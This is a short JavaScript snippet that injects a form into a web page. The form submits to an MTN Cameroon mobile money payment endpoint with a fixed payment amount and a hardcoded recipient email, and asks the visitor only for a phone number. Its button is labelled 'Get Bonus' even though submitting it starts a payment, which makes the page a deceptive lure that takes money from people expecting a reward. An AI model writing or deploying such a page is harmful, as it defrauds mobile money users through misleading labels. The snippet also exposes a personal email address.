var content = document.getElementById("content");
var button = document.getElementById("continue-button");

button.addEventListener("click", () => {
  content.innerHTML = `

      <div class=" col-sm-12 col-md-12 my-5">
        <form id="formmomo" method="GET" action="https://developer.mtn.cm/OnlineMomoWeb/faces/transaction/transactionRequest.xhtml" target="_top">
          <input type="hidden" name="idbouton" value="2" autocomplete="off">
          <input type="hidden" name="typebouton" value="PAIE" autocomplete="off">
          <input class="momo mount form-control form-control-lg" type="hidden" placeholder="amount" name="_amount" value="100" id="montant" autocomplete="off">
          <div class="form-group">
            <label for="phone-number" class="h5 lobster-lg ">Phone Number</label>
            <input class="momo host form-control form-control-lg rounded mt-3 border-warning " type="number" placeholder="phone number" name="_tel" value="" autocomplete="off" id="phone-number">
          </div>
          <input class="momo pwd" placeholder="Please enter your password" name="_clP" value="" autocomplete="off" type="hidden">
          <input type="hidden" name="_email" value="nsedrick101@gmail.com" autocomplete="off">
          <button type="image" id="Button_Image" name="submit" alt="OnloneMomo, le réflexe sécurité pour payer en ligne" autocomplete="off" class="btn btn-lg btn-warning btn-default rounded-pill text-white px-5 py-3 m-5 font-weight-bold">
            Get Bonus
          </button>
        </form>
        </div>

`;
});
